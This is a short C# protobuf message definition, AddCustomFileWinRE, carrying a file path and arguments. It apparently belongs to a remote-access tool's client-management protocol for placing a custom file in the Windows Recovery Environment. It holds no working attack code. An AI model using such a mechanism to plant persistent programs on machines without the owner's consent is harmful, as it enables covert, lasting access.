using ProtoBuf;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.ClientManagement.WinRE
{
    [ProtoContract]
    public class AddCustomFileWinRE : IMessage
    {
        [ProtoMember(1)]
        public string Path { get; set; } = string.Empty;

        [ProtoMember(2)]
        public string Arguments { get; set; } = string.Empty;
    }
}
